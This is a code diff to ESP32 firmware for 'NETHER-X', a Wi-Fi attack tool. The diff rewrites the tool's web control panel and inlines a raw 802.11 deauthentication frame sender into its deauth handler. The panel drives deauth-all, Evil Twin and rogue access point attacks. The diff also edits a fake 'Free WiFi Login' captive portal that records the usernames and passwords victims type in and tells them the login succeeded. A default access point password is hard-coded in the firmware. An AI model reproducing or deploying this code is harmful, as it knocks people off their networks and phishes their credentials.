@@ -15,8 +15,6 @@ const IPAddress apIP(8, 8, 8, 8);
 bool attackOn = false;
 bool evilTwinOn = false;
 bool rogueOn = false;
-int devices[50];
-int deviceCount = 0;
 
 struct Target {
   String ssid;
@@ -35,16 +33,6 @@ void startAP() {
   Serial.println("AP Started: " + String(ap_ssid));
 }
 
-void stopAll() {
-  attackOn = false;
-  evilTwinOn = false;
-  rogueOn = false;
-  dns.stop();
-  WiFi.softAPdisconnect(true);
-  delay(100);
-  startAP();
-}
-
 void scanNetworks() {
   int n = WiFi.scanNetworks();
   targetCount = 0;
@@ -57,24 +45,6 @@ void scanNetworks() {
   }
   WiFi.scanDelete();
   Serial.println("Found " + String(targetCount) + " networks");
-}
-
-void deauthTarget(uint8_t* bssid, int ch) {
-  uint8_t pkt[26] = {
-    0xC0, 0x00, 0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x01, 0x00
-  };
-  memcpy(&pkt[4], bssid, 6);
-  memcpy(&pkt[16], bssid, 6);
-  
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-  for (int i = 0; i < 20; i++) {
-    esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
-    delayMicroseconds(100);
-  }
 }
 
 void deauthTask(void* param) {
@@ -123,34 +93,75 @@ void deauthTask(void* param) {
 }
 
 void handleRoot() {
-  String html = R"(<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NETHER-X</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a1a;color:#fff;min-height:100vh}.header{background:linear-gradient(135deg,#00f,00c,#06f);padding:25px;text-align:center}.header h1{font-size:2.5em;text-shadow:0 0 20px rgba(0,200,255,0.8);margin-bottom:5px}.header p{color:#0ff;font-size:1.1em}.container{max-width:1200px;margin:0 auto;padding:20px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:20px}.card{background:#1a1a3a;border-radius:15px;padding:20px;border:2px solid #00f;box-shadow:0 0 20px rgba(0,100,255,0.3)}.card h2{color:#0ff;border-bottom:2px solid #00f;padding-bottom:10px;margin-bottom:15px;font-size:1.3em}.status{display:inline-block;padding:8px 20px;border-radius:25px;font-weight:bold;margin:5px}.on{background:#0f0;color:#000}.off{background:#f00;color:#fff}button{background:linear-gradient(135deg,#00f,00c);color:#fff;border:none;padding:12px 25px;border-radius:8px;cursor:pointer;font-size:1em;margin:5px;transition:all 0.3s}.button:hover{transform:scale(1.05);box-shadow:0 0 15px rgba(0,200,255,0.5)}.btn-start{background:linear-gradient(135deg,#0f0,#0c0)}.btn-stop{background:linear-gradient(135deg,#f00,#c00)}.btn-danger{background:linear-gradient(135deg,#f80,#c60)}input,select{width:100%;padding:12px;margin:8px 0;background:#0a0a2a;border:2px solid #00f;color:#fff;border-radius:8px;font-size:1em}table{width:100%;border-collapse:collapse;margin-top:10px}th{background:#00f;color:#fff;padding:12px;text-align:left}td{padding:10px;border-bottom:1px solid #333}.log{background:#000;border:2px solid #0f0;border-radius:8px;padding:15px;font-family:monospace;max-height:250px;overflow-y:auto;white-space:pre-wrap;color:#0f0}.footer{text-align:center;padding:20px;color:#666;font-size:0.9em;margin-top:30px;border-top:1px solid #333}@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}loading{animation:pulse 1s infinite}</style></head><body>)";
+  String html = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>NETHER-X</title><style>";
+  html += "* { margin: 0; padding: 0; box-sizing: border-box; } ";
+  html += "body { font-family: Arial, sans-serif; background: #0a0a1a; color: #fff; min-height: 100vh; } ";
+  html += ".header { background: linear-gradient(135deg, #0066ff, #003399); padding: 25px; text-align: center; } ";
+  html += ".header h1 { font-size: 2.5em; color: #00ffff; margin-bottom: 5px; text-shadow: 0 0 20px rgba(0,255,255,0.8); } ";
+  html += ".header p { color: #00ffff; font-size: 1.1em; } ";
+  html += ".container { max-width: 1200px; margin: 0 auto; padding: 20px; } ";
+  html += ".grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; } ";
+  html += ".card { background: #1a1a3a; border-radius: 15px; padding: 20px; border: 2px solid #0066ff; box-shadow: 0 0 20px rgba(0,100,255,0.3); } ";
+  html += ".card h2 { color: #00ffff; border-bottom: 2px solid #0066ff; padding-bottom: 10px; margin-bottom: 15px; } ";
+  html += ".status { display: inline-block; padding: 8px 20px; border-radius: 25px; font-weight: bold; } ";
+  html += ".on { background: #00ff00; color: #000; } ";
+  html += ".off { background: #ff0000; color: #fff; } ";
+  html += "button { background: linear-gradient(135deg, #0066ff, #003399); color: #fff; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1em; margin: 5px; } ";
+  html += "button:hover { transform: scale(1.05); box-shadow: 0 0 15px rgba(0,200,255,0.5); } ";
+  html += ".btn-start { background: linear-gradient(135deg, #00ff00, #00cc00); } ";
+  html += ".btn-stop { background: linear-gradient(135deg, #ff0000, #cc0000); } ";
+  html += ".btn-danger { background: linear-gradient(135deg, #ff8800, #cc6600); } ";
+  html += "input, select { width: 100%; padding: 12px; margin: 8px 0; background: #0a0a2a; border: 2px solid #0066ff; color: #fff; border-radius: 8px; font-size: 1em; } ";
+  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; } ";
+  html += "th { background: #0066ff; color: #fff; padding: 12px; text-align: left; } ";
+  html += "td { padding: 10px; border-bottom: 1px solid #333; } ";
+  html += ".log { background: #000; border: 2px solid #00ff00; border-radius: 8px; padding: 15px; font-family: monospace; max-height: 250px; overflow-y: auto; white-space: pre-wrap; color: #00ff00; } ";
+  html += ".footer { text-align: center; padding: 20px; color: #666; font-size: 0.9em; margin-top: 30px; border-top: 1px solid #333; } ";
+  html += "</style></head><body>";
   
-  html += R"(<div class="header"><h1>⚡ NETHER-X ⚡</h1><p>WiFi Penetration Testing Tool - ESP32</p></div><div class="container">)";
+  html += "<div class='header'><h1>NETHER-X</h1><p>WiFi Penetration Testing Tool - ESP32</p></div>";
+  html += "<div class='container'><div class='grid'>";
   
-  html += R"(<div class="grid"><div class="card"><h2>📡 Status</h2>)";
+  html += "<div class='card'><h2>Status</h2>";
   html += "<p>SSID: <strong>" + String(ap_ssid) + "</strong></p>";
   html += "<p>Password: <strong>" + String(ap_pass) + "</strong></p>";
   html += "<p>IP: <strong>8.8.8.8</strong></p>";
   html += "<p>Mode: <span class='status " + String(attackOn ? "on" : "off") + "'>" + String(attackOn ? "ATTACKING" : "IDLE") + "</span></p>";
   html += "<p>Evil Twin: <span class='status " + String(evilTwinOn ? "on" : "off") + "'>" + String(evilTwinOn ? "ACTIVE" : "OFF") + "</span></p>";
   html += "<p>Networks: <strong id='netCount'>" + String(targetCount) + "</strong></p>";
-  html += R"(</div>)";
-
-  html += R"(<div class="card"><h2>🔍 WiFi Scanner</h2><button class="btn" onclick="scan()">🔍 Scan Networks</button><div id="networks"></div></div>)";
-
-  html += R"(<div class="card"><h2>⚡ Deauth Attack</h2><button class="btn btn-start" onclick="startDeauth()">🚀 Start Deauth All</button><button class="btn btn-stop" onclick="stopDeauth()">🛑 Stop</button></div>)";
-
-  html += R"(<div class="card"><h2>👻 Evil Twin</h2><input type="text" id="etSSID" placeholder="Target SSID"><input type="number" id="etCH" placeholder="Channel" value="1"><button class="btn" onclick="startET()">👻 Start Evil Twin</button><button class="btn btn-danger" onclick="stopET()">🛑 Stop</button></div>)";
-
-  html += R"(<div class="card"><h2>🎭 Rogue AP</h2><input type="text" id="rogueSSID" value="Free_WiFi" placeholder="Fake SSID"><button class="btn" onclick="startRogue()">🎭 Start Rogue AP</button><button class="btn btn-danger" onclick="stopRogue()">🛑 Stop</button></div>)";
-
-  html += R"(<div class="card"><h2>📋 Captured Credentials</h2><button class="btn" onclick="loadLogs()">🔄 Refresh Logs</button><div id="logs" class="log">No credentials captured yet</div></div>)";
-
-  html += R"(<div class="card"><h2>⚙️ Settings</h2><input type="text" id="newSSID" value="GMpro"><input type="text" id="newPASS" value="Sangkur87"><button class="btn" onclick="saveSettings()">💾 Save & Reboot</button><button class="btn btn-danger" onclick="resetAll()">🔄 Factory Reset</button></div>)";
+  html += "</div>";
   
-  html += R"(</div><div class="footer">NETHER-X v1.0 | ESP32 Edition | GMpro Network</div></div>)";
-
-  html += R"(<script>let targets=[];function scan(){fetch('/scan').then(r=>r.json()).then(d=>{targets=d;document.getElementById('netCount').textContent=d.length;let t='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>CH</th><th>ENC</th><th>Action</th></tr>';d.forEach((n,i)=>{t+='<tr><td>'+i+'</td><td>'+(n.ssid||'<i>Hidden</i>')+'</td><td>'+n.rssi+' dBm</td><td>'+n.ch+'</td><td>'+(n.enc?'🔒':'🔓')+'</td><td><button class=btn onclick=deauth('+i+')>⚡Deauth</button></td></tr>';});t+='</table>';document.getElementById('networks').innerHTML=t;});}function deauth(i){fetch('/deauth?i='+i);}function startDeauth(){fetch('/deauthstart');}function stopDeauth(){fetch('/deauthstop').then(()=>location.reload());}function startET(){fetch('/etstart?ssid='+encodeURIComponent(document.getElementById('etSSID').value)+'&ch='+document.getElementById('etCH').value);}function stopET(){fetch('/etstop');}function startRogue(){fetch('/rstart?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value));}function stopRogue(){fetch('/rstop');}function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d||'No data');}function saveSettings(){fetch('/save?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Saved! Rebooting...'));}function resetAll(){if(confirm('Factory reset?'))fetch('/reset');}setInterval(scan,15000);scan();</script></body></html>)";
+  html += "<div class='card'><h2>WiFi Scanner</h2><button onclick='scan()'>Scan Networks</button><div id='networks'></div></div>";
+  
+  html += "<div class='card'><h2>Deauth Attack</h2><button class='btn-start' onclick='startDeauth()'>Start Deauth All</button><button class='btn-stop' onclick='stopDeauth()'>Stop</button></div>";
+  
+  html += "<div class='card'><h2>Evil Twin</h2><input type='text' id='etSSID' placeholder='Target SSID'><input type='number' id='etCH' placeholder='Channel' value='1'><button onclick='startET()'>Start Evil Twin</button><button class='btn-danger' onclick='stopET()'>Stop</button></div>";
+  
+  html += "<div class='card'><h2>Rogue AP</h2><input type='text' id='rogueSSID' value='Free_WiFi' placeholder='Fake SSID'><button onclick='startRogue()'>Start Rogue AP</button><button class='btn-danger' onclick='stopRogue()'>Stop</button></div>";
+  
+  html += "<div class='card'><h2>Captured Credentials</h2><button onclick='loadLogs()'>Refresh Logs</button><div id='logs' class='log'>No credentials captured yet</div></div>";
+  
+  html += "<div class='card'><h2>Settings</h2><input type='text' id='newSSID' value='GMpro'><input type='text' id='newPASS' value='Sangkur87'><button onclick='saveSettings()'>Save and Reboot</button><button class='btn-danger' onclick='resetAll()'>Factory Reset</button></div>";
+  
+  html += "</div><div class='footer'>NETHER-X v1.0 | ESP32 Edition | GMpro Network</div></div>";
+  
+  html += "<script>";
+  html += "let targets=[];";
+  html += "function scan(){fetch('/scan').then(r=>r.json()).then(d=>{targets=d;document.getElementById('netCount').textContent=d.length;let t='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>CH</th><th>ENC</th><th>Action</th></tr>';";
+  html += "d.forEach((n,i)=>{t+='<tr><td>'+i+'</td><td>'+(n.ssid||'Hidden')+'</td><td>'+n.rssi+' dBm</td><td>'+n.ch+'</td><td>'+(n.enc?'Locked':'Open')+'</td><td><button onclick=deauth('+i+')>Deauth</button></td></tr>';});";
+  html += "t+='</table>';document.getElementById('networks').innerHTML=t;});}";
+  html += "function deauth(i){fetch('/deauth?i='+i);}";
+  html += "function startDeauth(){fetch('/deauthstart');}";
+  html += "function stopDeauth(){fetch('/deauthstop').then(()=>location.reload());}";
+  html += "function startET(){fetch('/etstart?ssid='+encodeURIComponent(document.getElementById('etSSID').value)+'&ch='+document.getElementById('etCH').value);}";
+  html += "function stopET(){fetch('/etstop');}";
+  html += "function startRogue(){fetch('/rstart?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value));}";
+  html += "function stopRogue(){fetch('/rstop');}";
+  html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d||'No data');}";
+  html += "function saveSettings(){fetch('/save?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Saved! Rebooting...'));}";
+  html += "function resetAll(){if(confirm('Factory reset?'))fetch('/reset');}";
+  html += "setInterval(scan,15000);scan();";
+  html += "</script></body></html>";
   
   server.send(200, "text/html", html);
 }
@@ -192,9 +203,20 @@ void handleDeauth() {
     sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
     
+    uint8_t pkt[26] = {
+      0xC0, 0x00, 0x3A, 0x01,
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x01, 0x00
+    };
+    memcpy(&pkt[4], bssid, 6);
+    memcpy(&pkt[16], bssid, 6);
+    
     for (int i = 0; i < 50; i++) {
-      deauthTarget(bssid, targets[idx].ch);
-      delay(10);
+      esp_wifi_set_channel(targets[idx].ch, WIFI_SECOND_CHAN_NONE);
+      esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
+      delayMicroseconds(100);
     }
     Serial.println("Deauth sent to: " + targets[idx].ssid);
   }
@@ -249,16 +271,16 @@ void handleRogueStart() {
       prefs.putString("log", log);
       prefs.end();
       Serial.println("CAPTURED -> User:" + user + " Pass:" + pass);
-      server.send(200, "text/html", "<html><body style='background:#0a0a1a;color:#fff;text-align:center;padding:50px'><h1 style='color:#0f0'>✅ Login Successful!</h1><p>You are now connected.</p></body></html>");
+      server.send(200, "text/html", "<html><body style='background:#0a0a1a;color:#fff;text-align:center;padding:50px'><h1 style='color:#0f0'>Login Successful!</h1><p>You are now connected.</p></body></html>");
     });
     
     server.onNotFound([]() {
       String html = "<html><body style='background:#0a0a1a;color:#fff;text-align:center;padding:50px'>";
-      html += "<h1>📶 Free WiFi Login</h1>";
+      html += "<h1>Free WiFi Login</h1>";
       html += "<form action='/login' method='post' style='max-width:300px;margin:30px auto'>";
       html += "<input name='user' placeholder='Username' style='width:100%;padding:12px;margin:8px 0;border-radius:8px'>";
       html += "<input type='password' name='pass' placeholder='Password' style='width:100%;padding:12px;margin:8px 0;border-radius:8px'>";
-      html += "<button style='width:100%;padding:15px;background:linear-gradient(135deg,#0f0,#0c0);color:#000;border:none;border-radius:8px;font-size:1.1em;cursor:pointer'>Connect</button>";
+      html += "<button style='width:100%;padding:15px;background:#00ff00;color:#000;border:none;border-radius:8px;font-size:1.1em;cursor:pointer'>Connect</button>";
       html += "</form></body></html>";
       server.send(200, "text/html", html);
     });
